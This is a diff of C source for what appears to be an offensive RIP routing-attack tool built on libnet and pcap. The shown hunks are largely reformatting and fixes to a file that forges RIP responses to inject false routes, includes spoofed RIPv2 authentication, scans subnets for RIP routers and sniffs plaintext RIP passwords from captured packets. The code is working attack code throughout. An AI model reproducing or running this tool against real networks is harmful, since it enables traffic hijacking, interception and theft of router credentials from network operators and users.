@@ -177,11 +177,12 @@ send_fake_rip_response ()
 
   l = libnet_init (LIBNET_RAW4, dev, errbuf);
 
-  udp = libnet_build_udp (RIP_PORT, RIP_PORT, LIBNET_UDP_H + sizeof (struct rip) + sizeof (struct rip_message) * w+1,
-			  0,
-			  buffer,
-			  sizeof (struct rip) +
-			  sizeof (struct rip_message) * w, l, 0);
+  udp =
+    libnet_build_udp (RIP_PORT, RIP_PORT,
+		      LIBNET_UDP_H + sizeof (struct rip) +
+		      sizeof (struct rip_message) * w + 1, 0, buffer,
+		      sizeof (struct rip) + sizeof (struct rip_message) * w,
+		      l, 0);
 
   ip =
     libnet_build_ipv4 (LIBNET_IPV4_H + LIBNET_UDP_H + sizeof (struct rip) +
@@ -199,31 +200,6 @@ send_fake_rip_response ()
       sleep (30);
     }
 
-}
-
-// the sysctl(2) for checking ip forward
-// doesn't seem to work propertly, so using proc fs
-void
-check_forward ()
-{
-  FILE *fd;
-  char c;
-
-  if ((fd = fopen ("/proc/sys/net/ipv4/ip_forward", "r+")) < 0)
-    fatal (" failed to open file: %s\n", strerror (errno));
-  fscanf (fd, "%c", &c);
-  fclose (fd);
-
-  if (c != '1')
-    {
-      printf ("\n IP FORWARDING IS NOT SET...ATTACK WONT WORK!\n");
-      printf ("\n Program will terminate...if you wanna continue anyway\n");
-      printf
-	(" run it with -f option or set packet forwarding on your box\n\n");
-      exit (1);
-    }
-  else
-    printf ("\n IP FORWARDING SET. Starting attack!\n\n");
 }
 
 void
@@ -257,7 +233,7 @@ check_injection ()
   peer.sin_port = htons (RIP_PORT);
 
   if ((sock = socket (AF_INET, SOCK_DGRAM, 0)) < 0)
-        fatal (" failed to create socket: %s\n\n", strerror (errno));
+    fatal (" failed to create socket: %s\n\n", strerror (errno));
 
   fcntl (sock, F_SETFL, O_NONBLOCK);
 
@@ -266,56 +242,59 @@ check_injection ()
   while (1)
     {
       rippo = (struct rip_message *) (buffer + 4);
-      if (sendto(sock, buffer_pkt, sizeof (struct rip) + sizeof (struct rip_message) * w, 0, (struct sockaddr *) &peer, sizeof (peer)) < 0)
-     fatal ("  failed to send packets: %s\n\n", strerror (errno));
-  sleep (1);
-  if ((letti = recvfrom (sock, buffer, BUFLEN, 0, NULL, NULL)) < 0)
-              printf ("\nNo Response (try -x)\n");
+      if (sendto
+	  (sock, buffer_pkt,
+	   sizeof (struct rip) + sizeof (struct rip_message) * w, 0,
+	   (struct sockaddr *) &peer, sizeof (peer)) < 0)
+	fatal ("  failed to send packets: %s\n\n", strerror (errno));
+      sleep (1);
+      if ((letti = recvfrom (sock, buffer, BUFLEN, 0, NULL, NULL)) < 0)
+	printf ("\nNo Response (try -x)\n");
 
-  for (i = 0; i < w; i++)
-    {
-      for (; (u_long) * (&rippo) < (u_long) (&buffer) + letti; rippo++)
-        {
-          if (rippo->ip == routes[0][i])
-            {
-              if (ntohl (rippo->metric) == ntohl (routes[3][i]) + 1)
-                {
-                  printf ("\nRoute %s: Injected Correctly\n", in_ntoa (rippo->ip));
-		  fflush (stdout);
-		  break;
+      for (i = 0; i < w; i++)
+	{
+	  for (; (u_long) * (&rippo) < (u_long) (&buffer) + letti; rippo++)
+	    {
+	      if (rippo->ip == routes[0][i])
+		{
+		  if (ntohl (rippo->metric) == ntohl (routes[3][i]) + 1)
+		    {
+		      printf ("\nRoute %s: Injected Correctly\n",
+			      in_ntoa (rippo->ip));
+		      fflush (stdout);
+		      break;
+		    }
+		  else
+		    {
+		      printf ("\nRoute %s: Injection Failed\n",
+			      in_ntoa (rippo->ip));
+		      fflush (stdout);
+		      break;
+		    }
 		}
-	      else
-	        {
-	          printf ("\nRoute %s: Injection Failed\n", in_ntoa (rippo->ip));
-		  fflush (stdout);
-		  break;
-		}
-            }
+	    }
 	}
+      bzero (&buffer, sizeof (buffer));
+      sleep (30);
     }
-  bzero (&buffer, sizeof (buffer));
-  sleep (30);
-  }
 }
-  
+
 void
 pack_handler (u_char * args, const struct pcap_pkthdr *header,
 	      const u_char * packet)
 {
   struct iphdr *ip;
   struct rip_message *rip_head;
-  struct udphdr *udp;
-
+  
   ip = (struct iphdr *) (packet + sizeof_datalink (handle));
   rip_head = (struct rip_message *) (packet + sizeof_datalink (handle) +
-				     sizeof (ip) + sizeof (udp) + 4);
+				     sizeof (struct iphdr) + sizeof (struct udphdr) + 4);
 
-  printf (" HOST %s SPEAKS RIPv%i!!\n", in_ntoa ((unsigned long) handle),
-	  *(packet + sizeof_datalink (handle) + sizeof (ip) + sizeof (udp) +
-	    1));
+
+  printf (" HOST %s SPEAKS RIPv%i!!\n", in_ntoa ((unsigned long) ip->saddr),
+	  *(packet + sizeof_datalink (handle) + sizeof (struct iphdr) + sizeof (struct udphdr) +1));
   printf (" *-*-*-*-*-*-*-*-*-*-*-*-*\n");
-  for (; (u_long) * (&rip_head) < (u_long) (packet) + header->caplen;
-       rip_head++)
+  for (; (u_long) * (&rip_head) < (u_long) (packet) + header->caplen; rip_head++)
     {
       printf ("   |-- IP: %s\n", in_ntoa (rip_head->ip));
       printf ("   |------ Metric: %u\n", ntohl (rip_head->metric));
@@ -348,11 +327,10 @@ scan_net (char *net)
   int sock;
   unsigned long start, end;
   struct
-  {
-    struct rip rip_head;
-    struct rip_message entry;
-  }
-  rip_scan;
+    {
+      struct rip rip_head;
+      struct rip_message entry;
+    } rip_scan;
   struct sockaddr_in peers;
 
   peers.sin_family = AF_INET;
@@ -360,8 +338,7 @@ scan_net (char *net)
 
   pcap_arg = strdup (net);
   if ((prefix = memchr (net, '/', strlen (net))) == NULL)
-    fatal
-      (" You must use the subnet/prefix format!!!\n Example: 192.168.0.0/24 format!!!\n\n");
+    fatal(" You must use the subnet/prefix format!!!\n Example: 192.168.0.0/24 format!!!\n\n");
   *(prefix) = '\0';
   start = inet_network (net);
   end = start + (1 << (32 - atoi (++prefix)));
@@ -380,13 +357,12 @@ scan_net (char *net)
   for (; start <= end; start++)
     {
       if (!(start & 0xff))
-	start++;
+      start++;
       if ((start & 0xff) == 255)
-	start++;
+      start++;
       peers.sin_addr.s_addr = htonl (start);
       sock = socket (AF_INET, SOCK_DGRAM, 0);
-      sendto (sock, &rip_scan, sizeof (rip_scan), 0,
-	      (struct sockaddr *) &peers, sizeof (peers));
+      sendto (sock, &rip_scan, sizeof (rip_scan), 0, (struct sockaddr *) &peers, sizeof (peers));
       close (sock);
     }
 
@@ -422,32 +398,40 @@ rip_file_read (char *filez)
   fclose (OPENF);
 }
 
-void  
-pack_handler_sniff (u_char * args, const struct pcap_pkthdr *header, const u_char * packet)
+void
+pack_handler_sniff (u_char * args, const struct pcap_pkthdr *header,
+		    const u_char * packet)
 {
-struct authentication *auth;
+  struct authentication *auth;
 
-auth = (struct authentication *)(packet + sizeof_datalink(handle) + sizeof(struct iphdr) + sizeof(struct udphdr)+ sizeof(struct rip)); 
-printf("Packet Examined... ");
+  auth =
+    (struct authentication *) (packet + sizeof_datalink (handle) +
+			       sizeof (struct iphdr) +
+			       sizeof (struct udphdr) + sizeof (struct rip));
+  printf ("Packet Examined... ");
 
-if ((auth->flag == 0xFFFF) && (auth->auth_type == htons(2)))
-	printf("password found == %s\n", auth->passwd);
-else printf("and there is no authentication header\n");
+  if ((auth->flag == 0xFFFF) && (auth->auth_type == htons (2)))
+    printf ("password found == %s\n", auth->passwd);
+  else
+    printf ("and there is no authentication header\n");
 }
 
-void sniff_passwd()
+void
+sniff_passwd ()
 {
   struct bpf_program filter;
   char *filter_app = "udp src port 520";
 
   handle = pcap_open_live (dev, BUFSIZ, 1, -1, errbuf);
   if (pcap_compile (handle, &filter, filter_app, 0, 0) < 0)
-		        fatal (" pcap_compile: %s\n\n", pcap_geterr (handle));
+    fatal (" pcap_compile: %s\n\n", pcap_geterr (handle));
   pcap_setfilter (handle, &filter);
-while(1)  pcap_dispatch (handle, -1, pack_handler_sniff, NULL);
+  while (1)
+    pcap_dispatch (handle, -1, pack_handler_sniff, NULL);
 }
 
-void auth_pass()
+void
+auth_pass ()
 {
   libnet_t *l;
   libnet_ptag_t udp;
@@ -460,21 +444,24 @@ void auth_pass()
   int i;
 
   pack = (struct rip *) (buffer);
-  auth = (struct authentication *)(buffer + sizeof (struct rip));
-  entries = (struct rip_message *)(buffer + sizeof (struct rip) + sizeof (struct authentication));
+  auth = (struct authentication *) (buffer + sizeof (struct rip));
+  entries =
+    (struct rip_message *) (buffer + sizeof (struct rip) +
+			    sizeof (struct authentication));
 
   pack->command = 2;
   pack->version = 2;
 
   auth->flag = 0xFFFF;
-  auth->auth_type = htons(2);
-  strncpy(auth->passwd,password,16);
+  auth->auth_type = htons (2);
+  strncpy (auth->passwd, password, 16);
 
-  if (w == 25) w--;
-  
+  if (w == 25)
+    w--;
+
   for (i = 0; i < w; i++)
     {
-      entries->family = htons(2);
+      entries->family = htons (2);
       entries->tag = 0;
       entries->ip = routes[0][i];
       entries->netmask = routes[1][i];
@@ -482,56 +469,36 @@ void auth_pass()
       entries->metric = routes[3][i];
       entries++;
     }
-  
+
   l = libnet_init (LIBNET_RAW4, dev, errbuf);
-  
-  udp = libnet_build_udp (RIP_PORT, 
-		          RIP_PORT, 
-			  LIBNET_UDP_H + sizeof (struct rip) + sizeof (struct authentication)+ sizeof(struct rip_message) * w,
-			  0,
-			  buffer,
+
+  udp = libnet_build_udp (RIP_PORT,
+			  RIP_PORT,
+			  LIBNET_UDP_H + sizeof (struct rip) +
+			  sizeof (struct authentication) +
+			  sizeof (struct rip_message) * w, 0, buffer,
 			  sizeof (struct rip) +
-			  sizeof (struct authentication) + 
-                          sizeof (struct rip_message) * w+1, l, 0);
-  
+			  sizeof (struct authentication) +
+			  sizeof (struct rip_message) * w + 1, l, 0);
+
   ip = libnet_build_ipv4 (LIBNET_IPV4_H + LIBNET_UDP_H + sizeof (struct rip) +
-			  sizeof (struct authentication) + 
-                          sizeof (struct rip_message) *w+1, 
+			  sizeof (struct authentication) +
+			  sizeof (struct rip_message) * w + 1,
 			  0,
-			  3000 + (rand () % 100), 
-			  0, 
-			  64, 
-			  IPPROTO_UDP, 
+			  3000 + (rand () % 100),
 			  0,
-			  localaddr, 
-			  inet_addr (RIP_GROUP), 
-			  NULL, 
-			  0, 
-			  l, 
-			  0);
+			  64,
+			  IPPROTO_UDP,
+			  0, localaddr, inet_addr (RIP_GROUP), NULL, 0, l, 0);
 
   if (libnet_toggle_checksum (l, udp, 1) < 0)
     fatal ("error: %s\n\n", libnet_geterror (l));
-  
+
   while (1)
     {
       if ((libnet_write (l)) < 0)
 	fatal ("libnet_write(): %s\n\n", libnet_geterror (l));
       sleep (30);
-    }
-}
-
-void wait() {
-
-  while ((char) getchar() != 'q');
-    
-  fprintf (stderr, "\nExiting...\n");
-  pthread_cancel (pt);
-  pthread_join (pt, NULL);
-  if (flags & CHECK)
-    {
-      pthread_cancel (pt1);
-      pthread_join (pt1, NULL);
     }
 }
 
@@ -546,21 +513,24 @@ check_injection_crypt ()
   struct sockaddr_in peer;
 
   rip_head = (struct rip *) (buffer_pkt);
-  auth = (struct authentication *)(buffer_pkt + sizeof(struct rip));
-  entries = (struct rip_message *) (buffer_pkt + sizeof (struct rip)+ sizeof(struct authentication));
+  auth = (struct authentication *) (buffer_pkt + sizeof (struct rip));
+  entries =
+    (struct rip_message *) (buffer_pkt + sizeof (struct rip) +
+			    sizeof (struct authentication));
 
   rip_head->command = 1;
   rip_head->version = 2;
 
   auth->flag = 0xFFFF;
-  auth->auth_type = htons(2);
-  strncpy(auth->passwd, password, 16);
+  auth->auth_type = htons (2);
+  strncpy (auth->passwd, password, 16);
 
-  if (w == 25) w--;
-  
+  if (w == 25)
+    w--;
+
   for (i = 0; i < w; i++)
     {
-      entries->family = htons(2);
+      entries->family = htons (2);
       entries->tag = 0;
       entries->ip = routes[0][i];
       entries->netmask = routes[1][i];
@@ -568,7 +538,7 @@ check_injection_crypt ()
       entries->metric = routes[3][i];
       entries++;
     }
- 
+
   peer.sin_family = AF_INET;
   peer.sin_addr.s_addr = inet_addr (RIP_GROUP);
   peer.sin_port = htons (RIP_PORT);
@@ -580,38 +550,42 @@ check_injection_crypt ()
 
   sleep (5);
 
-  while (1) 
+  while (1)
     {
       rippo = (struct rip_message *) (buffer + 4);
-      if (sendto(sock, buffer_pkt, sizeof (struct rip) + sizeof (struct rip_message) * (w+1), 0, (struct sockaddr *) &peer, sizeof (peer)) < 0)
-         fatal ("  failed to send packets: %s\n\n", strerror (errno));
-      sleep (1); 
+      if (sendto
+	  (sock, buffer_pkt,
+	   sizeof (struct rip) + sizeof (struct rip_message) * (w + 1), 0,
+	   (struct sockaddr *) &peer, sizeof (peer)) < 0)
+	fatal ("  failed to send packets: %s\n\n", strerror (errno));
+      sleep (1);
       if ((letti = recvfrom (sock, buffer, BUFLEN, 0, NULL, NULL)) < 0)
-              printf ("\nNo Response (try -x)\n");
-			      
-      for (i = 0; i < w; i++) 
-        { 
-          for (; (u_long) * (&rippo) < (u_long) (&buffer) + letti; rippo++)
+	printf ("\nNo Response (try -x)\n");
+
+      for (i = 0; i < w; i++)
+	{
+	  for (; (u_long) * (&rippo) < (u_long) (&buffer) + letti; rippo++)
 	    {
 	      if (rippo->ip == routes[0][i])
-	        {
-	          if (ntohl (rippo->metric) == ntohl (routes[3][i]) + 1)
-	            {
-	              printf ("\nRoute %s: Injected Correctly\n", in_ntoa (rippo->ip));
-	              fflush (stdout);
-	              break;
-	            }
-	          else
-	            {
-	              printf ("\nRoute %s: Injection Failed\n", in_ntoa (rippo->ip));
-	              fflush (stdout);
-	              break;
-	            }
-	        }
+		{
+		  if (ntohl (rippo->metric) == ntohl (routes[3][i]) + 1)
+		    {
+		      printf ("\nRoute %s: Injected Correctly\n",
+			      in_ntoa (rippo->ip));
+		      fflush (stdout);
+		      break;
+		    }
+		  else
+		    {
+		      printf ("\nRoute %s: Injection Failed\n",
+			      in_ntoa (rippo->ip));
+		      fflush (stdout);
+		      break;
+		    }
+		}
 	    }
 	}
-    bzero (&buffer, sizeof (buffer));
-    sleep (30);
-   }
+      bzero (&buffer, sizeof (buffer));
+      sleep (30);
+    }
 }
-
